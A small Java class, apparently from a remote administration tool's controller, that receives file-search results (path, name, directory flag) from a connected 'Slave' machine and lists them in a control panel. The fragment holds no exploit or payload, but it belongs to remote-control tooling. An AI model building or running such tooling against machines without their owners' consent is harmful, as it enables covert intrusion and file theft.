package com.redpois0n.packets;

import com.redpois0n.Slave;
import com.redpois0n.ui.frames.FrameControlPanel;
import com.redpois0n.ui.panels.PanelControlSearch;
import com.redpois0n.utils.IconUtils;

public class PacketFF extends Packet {

	@Override
	public void read(Slave slave, String line) throws Exception {
		String path = slave.readLine();
		String name = slave.readLine();
		boolean dir = Boolean.parseBoolean(slave.readLine());

		FrameControlPanel frame = FrameControlPanel.instances.get(slave);
		if (frame != null) {
			PanelControlSearch panel = (PanelControlSearch) frame.panels.get("file searcher");
			panel.getModel().addRow(new Object[] { IconUtils.getFileIconFromExtension(name, dir), path, name });
		}
	}

}
